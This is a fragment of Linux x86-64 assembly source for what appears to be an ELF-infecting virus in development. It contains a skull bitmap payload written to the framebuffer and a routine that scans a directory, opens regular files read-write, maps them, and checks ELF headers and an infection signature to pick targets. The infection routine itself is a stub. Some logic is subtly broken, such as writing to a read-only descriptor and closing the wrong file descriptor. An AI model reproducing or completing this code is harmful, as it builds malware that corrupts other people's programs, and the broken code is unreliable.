			dd 0x7fff600,0x7fff600,0x7fff500,0x7fff600,0x7fff400,0x7fff400,0x7fff1300,0x7fff3000,0x7fff1b00,0x7fffc00,0x7fff2400,0x7fff4400,0x7fffd00,0x7fff300,0x7fff900,0x7fff1300,0x7fff1900,0x7fff2000,0x7fff1800,0x7fff700,0x7fff500,0x7fffb00,0x7fff1d00,0x7fff2800,0x7fff2e00,0x7fff2500,0x7fff2500,0x7fff2700,0x7fff4b00,0x7fff9a00,0x7fff5900,0x7fff3300,0x7fff3a00,0x7fff5c00,0x7fff4c00,0x7fff4e00,0x7fff2c00,0x7fff2d00,0x7fff2000,0x7fff3700,0x7fff4e00,0x7fff4300,0x7fff3100,0x7fff2900,0x7fff2c00,0x7fff2800,0x7fff4200,0x7fffa00,0x7fff200,0x7fff400,0x7fff2000,0x7fff3b00,0x7fff4100,0x7fff3500,0x7fff2600,0x7fff1400,0x7fffc00,0x7fffd00,0x7ffff00,0x7fff1100,0x7fff1300,0x7fff1700,0x7fff1c00,0x7fff207f
			dd 0x7fff700,0x7fff700,0x7fff600,0x7fff600,0x7fff400,0x7fff400,0x7fff300,0x7fff1b00,0x7fff4f00,0x7fff2700,0x7fffc00,0x7fff600,0x7fff700,0x7fff1500,0x7fff2300,0x7fff2600,0x7fff1800,0x7fff7c00,0x7fff9e00,0x7fff5600,0x7fff1d00,0x7fff500,0x7fff100,0x7fff200,0x7fff400,0x7fff400,0x7fff100,0x7fff1300,0x7fff3300,0x7fff4c00,0x7fff6d00,0x7fff5900,0x7fff4500,0x7fff6b00,0x7fff8100,0x7fff7800,0x7fff5000,0x7fff6c00,0x7fff6500,0x7fff4d00,0x7fff2d00,0x7fff3600,0x7fff5900,0x7fff6f00,0x7fff8c00,0x7fff7600,0x7fff7300,0x7fff3c00,0x7fff800,0x7fff400,0x7fff700,0x7fff1200,0x7fff2000,0x7fff4700,0x7fff5f00,0x7fff4a00,0x7fff1b00,0x7fff1200,0x7fff1100,0x7fff1000,0x7fff1200,0x7fff1500,0x7fff1900,0x7fff1f7f
			dd 0x7fff700,0x7fff600,0x7fff500,0x7fff500,0x7fff400,0x7fff300,0x7fff500,0x7fff2800,0x7fff6100,0x7fff1400,0x7fff300,0x7fff500,0x7fff1100,0x7fff2400,0x7fff1400,0x7fffd00,0x7fffb00,0x7fff8a00,0x7fff9b00,0x7fff8500,0x7fff8300,0x7fff4000,0x7fff1c00,0x7fff1000,0x7fffb00,0x7fff700,0x7fff400,0x7fff400,0x7fffc00,0x7fff1400,0x7fff2200,0x7fff1900,0x7fff1900,0x7fff1f00,0x7fff2400,0x7fff2b00,0x7fff2400,0x7fff3300,0x7fff8000,0x7fff9700,0x7fff8b00,0x7fff8200,0x7fff6b00,0x7fff4200,0x7fff4800,0x7fff4b00,0x7fff2900,0x7fff2b00,0x7fff2e00,0x7fff600,0x7fff400,0x7fff600,0x7fffa00,0x7fff1100,0x7fff3900,0x7fff4900,0x7fff4300,0x7fff2900,0x7fff1800,0x7fff1600,0x7fff1700,0x7fff1600,0x7fff1a00,0x7fff1e7f
			dd 0x7fff700,0x7fff500,0x7fff400,0x7fff400,0x7fff300,0x7fff200,0x7fff200,0x7ffff00,0x7fff3a00,0x7fff3200,0x7fff2200,0x7fff1a00,0x7fffa00,0x7fff1000,0x7fff400,0x7fff200,0x7fff500,0x7fff4e00,0x7fff7300,0x7fff8000,0x7fffb600,0x7fffb600,0x7fffb300,0x7fff9d00,0x7fff8800,0x7fff7f00,0x7fff7400,0x7fff6800,0x7fff6500,0x7fff7000,0x7fff7a00,0x7fff1a00,0x7fff1500,0x7fff2d00,0x7fff3400,0x7fff1900,0x7fff1c00,0x7fff2500,0x7fff5300,0x7fff6300,0x7fff5d00,0x7fff4800,0x7fff2000,0x7fff100,0x7fff000,0x7fff200,0x7fff900,0x7fffb00,0x7fff3800,0x7fff1f00,0x7fff300,0x7fff500,0x7fff700,0x7fff800,0x7fffb00,0x7fff2500,0x7fff4300,0x7fff4e00,0x7fff4500,0x7fff4200,0x7fff4000,0x7fff3600,0x7fff2d00,0x7fff227f
			dd 0x7fff800,0x7fff600,0x7fff500,0x7fff400,0x7fff300,0x7fff200,0x7fff200,0x7fff700,0x7fffe00,0x7fff1500,0x7fff2f00,0x7fff4b00,0x7fffc00,0x7fff300,0x7fff200,0x7fff100,0x7fff200,0x7fff2a00,0x7fff5d00,0x7fff5900,0x7fff8600,0x7fff9400,0x7fff9100,0x7fff8700,0x7fff7800,0x7fff6d00,0x7fff6100,0x7fff6000,0x7fff6500,0x7fff6200,0x7fff4100,0x7fff1c00,0x7fff3200,0x7fff2c00,0x7fff4500,0x7fff2600,0x7fffb00,0x7fff700,0x7fff1100,0x7ffff00,0x7fff1500,0x7fff3f00,0x7fff3a00,0x7fff1700,0x7fff100,0x7fff100,0x7fff200,0x7fffa00,0x7fff1f00,0x7fff4d00,0x7fff1000,0x7fff500,0x7fff700,0x7fff800,0x7fffa00,0x7fffb00,0x7fffb00,0x7fff1000,0x7fff1300,0x7fff1500,0x7fff1800,0x7fff1f00,0x7fff2f00,0x7fff367f
			dd 0x7fff900,0x7fff700,0x7fff600,0x7fff500,0x7fff300,0x7fff300,0x7fff200,0x7fff200,0x7fff200,0x7fff300,0x7fff400,0x7fff2700,0x7fff4c00,0x7fff1500,0x7fff600,0x7fffa00,0x7fffc00,0x7fffb00,0x7fff800,0x7fff500,0x7fff500,0x7fff500,0x7fff600,0x7fff600,0x7fff600,0x7fff500,0x7fff200,0x7fff200,0x7fff300,0x7fff200,0x7fff200,0x7fff1000,0x7fff3000,0x7fff300,0x7fff300,0x7fff300,0x7fff200,0x7fff200,0x7fff200,0x7fff200,0x7fffe00,0x7fff2b00,0x7fff800,0x7fff2000,0x7fff1e00,0x7fff1200,0x7fff400,0x7fff200,0x7fff600,0x7fff3500,0x7fff5100,0x7ffff00,0x7fff900,0x7fffa00,0x7fffb00,0x7fffb00,0x7fffb00,0x7fffc00,0x7fffd00,0x7ffff00,0x7fff1300,0x7fff1700,0x7fff1b00,0x7fff227f
			dd 0x7fffa00,0x7fff800,0x7fff700,0x7fff600,0x7fff400,0x7fff300,0x7fff300,0x7fff600,0x7fffa00,0x7fff1200,0x7fff2b00,0x7fff6300,0x7fff8500,0x7fff7100,0x7fff5b00,0x7fff6f00,0x7fff6900,0x7fff5900,0x7fff5f00,0x7fff4d00,0x7fff3800,0x7fff3100,0x7fff2700,0x7fff2400,0x7fff2500,0x7fff2800,0x7fff1d00,0x7fff1e00,0x7fff1e00,0x7fff1800,0x7fff2900,0x7fff3d00,0x7fff2300,0x7fff300,0x7fff200,0x7fff200,0x7fff200,0x7fff300,0x7fff900,0x7fff1100,0x7fff2500,0x7fffb00,0x7fff300,0x7fff1100,0x7fff3900,0x7fff4200,0x7fff3d00,0x7fff2400,0x7fff1400,0x7fffa00,0x7fff3f00,0x7fff3600,0x7fffa00,0x7fffa00,0x7fffb00,0x7fffc00,0x7fffc00,0x7fffd00,0x7ffff00,0x7fff1100,0x7fff1400,0x7fff1900,0x7fff1d00,0x7fff217f
			dd 0x7fffb00,0x7fff900,0x7fff800,0x7fff700,0x7fff600,0x7fff500,0x7fff500,0x7fff2b00,0x7fff5f00,0x7fff5d00,0x7fff7800,0x7fff7a00,0x7fff7c00,0x7fff7c00,0x7fff6800,0x7fff8600,0x7fff7a00,0x7fff5c00,0x7fff4d00,0x7fff4300,0x7fff1e00,0x7fff2300,0x7fffc00,0x7fffc00,0x7fff1200,0x7fff1e00,0x7fff1100,0x7fff1600,0x7fff3500,0x7fff1100,0x7fff2100,0x7fff2e00,0x7fff1800,0x7fff1000,0x7fff1100,0x7ffff00,0x7fff1400,0x7fff2100,0x7fff1900,0x7fffe00,0x7fff600,0x7fff200,0x7fff500,0x7fff2f00,0x7fff1400,0x7fff2b00,0x7fff2900,0x7ffff00,0x7fff1b00,0x7fff2e00,0x7fff4c00,0x7fff4000,0x7fff900,0x7fff900,0x7fffa00,0x7fffb00,0x7fffd00,0x7fffe00,0x7fff1000,0x7fff1300,0x7fff1b00,0x7fff2300,0x7fff2900,0x7fff357f
			dd 0x7fffd00,0x7fffb00,0x7fffa00,0x7fff900,0x7fff800,0x7fff700,0x7fff500,0x7fffb00,0x7fff5200,0x7fff6d00,0x7fff7400,0x7fff6400,0x7fff6700,0x7fff7500,0x7fff7300,0x7fff5e00,0x7fff3100,0x7fff1d00,0x7fff2600,0x7fff4900,0x7fff5b00,0x7fff3600,0x7fff1100,0x7fff2700,0x7fff3d00,0x7fff2e00,0x7fff1500,0x7fff2700,0x7fff4700,0x7fff1700,0x7ffff00,0x7fff1700,0x7fff1900,0x7fff1500,0x7fffe00,0x7fff1700,0x7fff4b00,0x7fff2600,0x7fff300,0x7fff200,0x7fff200,0x7fff300,0x7fff1a00,0x7fff1b00,0x7fff300,0x7fffe00,0x7fff4700,0x7fff900,0x7fff500,0x7fffb00,0x7fff1d00,0x7fffd00,0x7fff800,0x7fff900,0x7fffb00,0x7fffd00,0x7ffff00,0x7fff1100,0x7fff1600,0x7fff2100,0x7fff2700,0x7fff2200,0x7fff2600,0x7fff367f
			dd 0x7ffff00,0x7fffd00,0x7fffc00,0x7fffb00,0x7fff900,0x7fff800,0x7fff700,0x7fff2d00,0x7fff6500,0x7fff6200,0x7fff6000,0x7fff5b00,0x7fff5c00,0x7fff4b00,0x7fff4d00,0x7fff3900,0x7fff3a00,0x7fff7400,0x7fff7100,0x7fff5700,0x7fff6c00,0x7fffa600,0x7fff8000,0x7fff4700,0x7fff2800,0x7fff2000,0x7fff2a00,0x7fff7e00,0x7fff4200,0x7fff700,0x7fffa00,0x7fff4e00,0x7fff4600,0x7fff1200,0x7fffa00,0x7fff1200,0x7fff2b00,0x7fff4800,0x7fff1200,0x7fff300,0x7fff300,0x7fff1200,0x7fff2600,0x7fff400,0x7fff400,0x7fff600,0x7fff2e00,0x7fff2600,0x7fffe00,0x7fffc00,0x7fffb00,0x7fffc00,0x7fffe00,0x7fff1000,0x7fff1300,0x7fff1700,0x7fff1d00,0x7fff2500,0x7fff2c00,0x7fff2000,0x7fff1c00,0x7fff2000,0x7fff2700,0x7fff2d7f
			dd 0x7fff1200,0x7ffff00,0x7fffe00,0x7fffd00,0x7fffb00,0x7fffb00,0x7fff1a00,0x7fff4d00,0x7fff7200,0x7fff6000,0x7fff6700,0x7fff5800,0x7ffff00,0x7fff1900,0x7fff6200,0x7fffc00,0x7fff100,0x7fff6800,0x7fff7300,0x7fff1e00,0x7fff800,0x7fff7d00,0x7fff5800,0x7fff800,0x7fff700,0x7fff700,0x7fffb00,0x7fff7a00,0x7fff7c00,0x7fff2600,0x7fffa00,0x7fff4a00,0x7fff7e00,0x7fff2c00,0x7fff2100,0x7fff3700,0x7fff3a00,0x7fff2f00,0x7fff1100,0x7fff300,0x7ffff00,0x7fff2a00,0x7fffc00,0x7fff400,0x7fff400,0x7fff500,0x7fff1000,0x7fff2100,0x7fff1d00,0x7fff1c00,0x7fff1c00,0x7fff1a00,0x7fff1c00,0x7fff1d00,0x7fff1c00,0x7fff1c00,0x7fff1c00,0x7fff1c00,0x7fff1b00,0x7fff1c00,0x7fff2000,0x7fff2500,0x7fff2a00,0x7fff307f
			dd 0x7fff1600,0x7fff1300,0x7fff1100,0x7fff1000,0x7ffff00,0x7fff3a00,0x7fff8900,0x7fff7000,0x7fff5800,0x7fff2f00,0x7fff3a00,0x7fff2100,0x7fff1900,0x7fff2000,0x7fff6c00,0x7fff4000,0x7fff2700,0x7fff5e00,0x7fff9a00,0x7fff4b00,0x7fff3c00,0x7fff8000,0x7fffaf00,0x7fff9700,0x7fff9200,0x7fff8b00,0x7fff8d00,0x7fffae00,0x7fff9c00,0x7fff5100,0x7fff2c00,0x7fff2500,0x7fff2000,0x7fff1300,0x7fff1900,0x7fff1500,0x7fffb00,0x7fff400,0x7fff500,0x7fff1400,0x7fff2b00,0x7fff1100,0x7fff400,0x7fff500,0x7fff500,0x7fff600,0x7fff700,0x7fff800,0x7fff900,0x7fffb00,0x7fffd00,0x7fffe00,0x7ffff00,0x7fff1200,0x7fff1400,0x7fff1600,0x7fff1800,0x7fff1a00,0x7fff1d00,0x7fff2100,0x7fff2500,0x7fff2a00,0x7fff3000,0x7fff357f
			dd 0x7fff1a00,0x7fff1800,0x7fff1600,0x7fff1400,0x7fff1600,0x7fff5d00,0x7fff9400,0x7fff8100,0x7fff7b00,0x7fff8700,0x7fffa000,0x7fffaf00,0x7fffa600,0x7fffa700,0x7fffb500,0x7fffaf00,0x7fffa200,0x7fffac00,0x7fffb600,0x7fffab00,0x7fffa100,0x7fff8a00,0x7fffa300,0x7fffaa00,0x7fff6800,0x7fff6100,0x7fff4300,0x7fff3d00,0x7fff5000,0x7fffa00,0x7fff400,0x7fff400,0x7fff400,0x7fff400,0x7fff500,0x7fff500,0x7fff500,0x7fff600,0x7fff1700,0x7fff2700,0x7fffd00,0x7fff700,0x7fff700,0x7fff800,0x7fff900,0x7fffa00,0x7fffb00,0x7fffb00,0x7fffc00,0x7fffe00,0x7ffff00,0x7fff1100,0x7fff1300,0x7fff1500,0x7fff1700,0x7fff1a00,0x7fff1d00,0x7fff1f00,0x7fff2300,0x7fff2600,0x7fff2a00,0x7fff3000,0x7fff3500,0x7fff3b7f
			dd 0x7fff2000,0x7fff1d00,0x7fff1b00,0x7fff1a00,0x7fff2100,0x7fff8000,0x7fff7400,0x7fff4a00,0x7fff4500,0x7fff6100,0x7fff3600,0x7fff9500,0x7fff5200,0x7fff3400,0x7fff9f00,0x7fff5700,0x7fff2300,0x7fff9800,0x7fffa500,0x7fff2300,0x7fff1200,0x7fff1500,0x7fff7d00,0x7fffb100,0x7fff4c00,0x7fff2200,0x7fff1b00,0x7fff3100,0x7fff7200,0x7fff1500,0x7fff600,0x7fff600,0x7fff600,0x7fff700,0x7fff800,0x7fffa00,0x7fffe00,0x7fff1f00,0x7fff3b00,0x7fff1500,0x7fffc00,0x7fffa00,0x7fffb00,0x7fffb00,0x7fffc00,0x7fffd00,0x7fffe00,0x7ffff00,0x7fff1100,0x7fff1300,0x7fff1400,0x7fff1600,0x7fff1800,0x7fff1a00,0x7fff1c00,0x7fff1f00,0x7fff2200,0x7fff2500,0x7fff2800,0x7fff2b00,0x7fff2f00,0x7fff3400,0x7fff3b00,0x7fff417f
			dd 0x7fff2600,0x7fff2300,0x7fff2200,0x7fff2000,0x7fff2500,0x7fff5e00,0x7fff7d00,0x7fff7e00,0x7fff3d00,0x7fff4d00,0x7fff5d00,0x7fff7b00,0x7fff9700,0x7fff6000,0x7fffa800,0x7fffa500,0x7fff6700,0x7fff8900,0x7fffa900,0x7fff7a00,0x7fff5700,0x7fff6700,0x7fff9300,0x7fff7c00,0x7fff5000,0x7fff4500,0x7fff5400,0x7fff6300,0x7fff4100,0x7fffc00,0x7fffa00,0x7ffff00,0x7fff1200,0x7fff1f00,0x7fff2100,0x7fff1500,0x7fff1500,0x7fff1a00,0x7fff1500,0x7fffe00,0x7fffe00,0x7fffe00,0x7fff1000,0x7fff1000,0x7fff1100,0x7fff1200,0x7fff1300,0x7fff1500,0x7fff1600,0x7fff1800,0x7fff1900,0x7fff1b00,0x7fff1d00,0x7fff1f00,0x7fff2200,0x7fff2600,0x7fff2900,0x7fff2c00,0x7fff2e00,0x7fff3200,0x7fff3500,0x7fff3b00,0x7fff4100,0x7fff497f
			dd 0x7fff2e00,0x7fff2b00,0x7fff2900,0x7fff2c00,0x7fff4900,0x7fff6f00,0x7fff8b00,0x7fff8400,0x7fff7700,0x7fff6700,0x7fff5200,0x7fff4900,0x7fff3900,0x7fff4100,0x7fff4200,0x7fff3600,0x7fff4400,0x7fff4400,0x7fff4600,0x7fff4900,0x7fff4000,0x7fff4000,0x7fff2f00,0x7fff1e00,0x7fff1200,0x7ffff00,0x7fff1000,0x7fff1200,0x7fff1400,0x7fff1800,0x7fff1900,0x7fff1900,0x7fff1700,0x7fff1500,0x7fff1300,0x7fff1200,0x7fff1300,0x7fff1300,0x7fff1300,0x7fff1400,0x7fff1400,0x7fff1400,0x7fff1500,0x7fff1600,0x7fff1700,0x7fff1800,0x7fff1a00,0x7fff1b00,0x7fff1c00,0x7fff1e00,0x7fff2000,0x7fff2200,0x7fff2500,0x7fff2700,0x7fff2a00,0x7fff2d00,0x7fff3000,0x7fff3300,0x7fff3600,0x7fff3a00,0x7fff3e00,0x7fff4400,0x7fff4b00,0x7fff537f
			dd 0x7fff3900,0x7fff3700,0x7fff3a00,0x7fff4f00,0x7fff8d00,0x7fff8f00,0x7fff9000,0x7fff9200,0x7fff9900,0x7fff8000,0x7fff5200,0x7fff2a00,0x7fff3a00,0x7fff3700,0x7fff2d00,0x7fff2800,0x7fff2900,0x7fff2600,0x7fff2800,0x7fff3000,0x7fff3000,0x7fff3000,0x7fff3100,0x7fff2d00,0x7fff2900,0x7fff2900,0x7fff2b00,0x7fff2900,0x7fff2700,0x7fff2000,0x7fff1b00,0x7fff1a00,0x7fff1900,0x7fff1900,0x7fff1900,0x7fff1a00,0x7fff1b00,0x7fff1b00,0x7fff1b00,0x7fff1b00,0x7fff1c00,0x7fff1d00,0x7fff1e00,0x7fff1f00,0x7fff2000,0x7fff2200,0x7fff2300,0x7fff2500,0x7fff2600,0x7fff2800,0x7fff2900,0x7fff2b00,0x7fff2e00,0x7fff3000,0x7fff3200,0x7fff3500,0x7fff3800,0x7fff3c00,0x7fff3f00,0x7fff4300,0x7fff4800,0x7fff4f00,0x7fff5600,0x7fff5d7f
			dd 0x7fff4900,0x7fff4500,0x7fff5000,0x7fff6000,0x7fff7c00,0x7fff9f00,0x7fffa300,0x7fff8500,0x7fff7f00,0x7fff6c00,0x7fff5f00,0x7fff5300,0x7fff4e00,0x7fff4500,0x7fff3c00,0x7fff3700,0x7fff3500,0x7fff3100,0x7fff3000,0x7fff3200,0x7fff2e00,0x7fff2d00,0x7fff2d00,0x7fff2b00,0x7fff2900,0x7fff2800,0x7fff2700,0x7fff2600,0x7fff2500,0x7fff2500,0x7fff2400,0x7fff2400,0x7fff2400,0x7fff2400,0x7fff2400,0x7fff2400,0x7fff2500,0x7fff2500,0x7fff2600,0x7fff2700,0x7fff2800,0x7fff2900,0x7fff2900,0x7fff2a00,0x7fff2b00,0x7fff2e00,0x7fff3000,0x7fff3000,0x7fff3200,0x7fff3300,0x7fff3500,0x7fff3700,0x7fff3900,0x7fff3c00,0x7fff3e00,0x7fff4000,0x7fff4400,0x7fff4700,0x7fff4c00,0x7fff5100,0x7fff5600,0x7fff5c00,0x7fff6200,0x7fff007f
		;paintlen equ $-paint
		paintlen equ $-skullbitmap
;
;		
;		;push r8
;		;pop rsi
	paint:
;		;pop rsi
;		;lea rsi, skullbitmap
	;	mov rax, 0x2f666230
	;	mov rax, 0x2f6465762f666230
		mov rax, 0x3062662f7665642f  ;/dev/fb0 in little-endian
		mov [r14 + 100], rax
		lea rdi, [r14 + 100]
		xor rsi, rsi 		;no flags
		add rsi, 0x02000000
		mov rdx, O_RDONLY	;open read-only
		mov rax, SYS_OPEN
		syscall
		
		mov r9, rax
		mov rdi, rax
		;push rax
		;mov rax, 0x2f646576
		;push rax
		;mov rdi, rsp
;		;pop rdi
;		mov rdi, STDOUT
		mov rsi, skullbitmap
		mov rdx, paintlen
		mov rax, SYS_WRITE
		syscall

		mov rdi, r9
		mov rax, SYS_CLOSE
		syscall

		ret
		
	printteststr:
		;pop rsi
		lea rsi, skullbitmap
;		lea rsi, teststr
		mov rsi, teststr
		mov rdi, STDOUT
		mov rdx, paintlen
		;mov rdx, teststrlen
		mov rax, SYS_WRITE
	;	mov rdx, MAX_RDENT_BUF
		syscall
		jmp _restore		

;****************************************************************************************
;check_file:
;	open file -> fstat file (get file size) - > use fstat.size for mmap call & mmap file	
;	upon successful mmap, close file
;	use mmaped file for checks to confirm that the target file satisfies the following:
;	1. the target file is an executable
;	2. the target file is an ELF
;	3. the target file is a 64-bit ELF
;	4. (optional, but requirement for rn): the target file is for x86_64 arch
;	5. the target file is not already infected (check w signature at known offset)
;	*If all of the following above conditions hold, then call the infection routine
;	Otherwise, continue looping through the remaining files in the directory
;
;****************************************************************************************
check_file:
	push rcx
	cmp byte [rcx + r14 + 600 + linuxdirent.d_type], DT_REG
	jne checknext 
	check_elf:
		lea rdi, [rcx + r14 + 600 + linuxdirent.d_nameq]	;name of file in rdi
		mov rsi, OPEN_RDWR 					;flags - read/write in rsi
		xor rdx, rdx						;mode - 0
		mov rax, SYS_OPEN
		syscall

		test rax, rax
		js checknext

		mov r9, rax
		;mov [r14 + 500], rax				;save fd to opened file at designated spot on the stack
	
		get_filestat:
			lea rsi, [r14 + file_stat]
			mov rdi, r9
			mov rax, SYS_FSTAT
			syscall
		
		;void *mmap(void addr[.length], size_t length, int prot, int flags,
		;                  int fd, off_t offset);
		mmap_file:
			xor rdi, rdi			;set RDI to NULL
			mov rsi, [r14 + file_stat.st_size]
			mov rdx, PROT_READ
			mov r10, MAP_PRIVATE
			mov r8, r9
			xor r9, r9			;offset of 0 within file == start of file, obv	
			mov rax, SYS_MMAP
			syscall

			mov [r14 + 800 + elf_Ehdr], rax			;rax contains address of new mapping upon return from syscall
			
		close_curr_file:
			mov rdi, r9
			mov rax, SYS_CLOSE
			syscall
		
		check_elf_header_magic_bytes:
			cmp dword [r14+800+elf_Ehdr.e_ident], 0x464c457f
			jne checknext
		check_elf_header_64bit:
			cmp dword [r14+800+elf_Ehdr.e_ident+4], ELFCLASS64
			jne checknext
		
;		check_elf_header_arch:
;			jne checknext
		
		ready2infect:
			call infect	



	checknext:
		pop rcx
		add rcx, [rcx + r14 + 600 + linuxdirent.d_reclen]
		;add rcx, edx
		cmp qword rcx, [r14 + 200]
		jne check_file
		jmp _restore
			
infect:
	jmp printteststr
	

;;restore stack to original state
_restore:
	add rsp, 0x400
	pop rbp
	
;exit
_end:
	xor rdi, rdi
	mov rax, 0x3c ;exit() syscall on x64
	syscall	

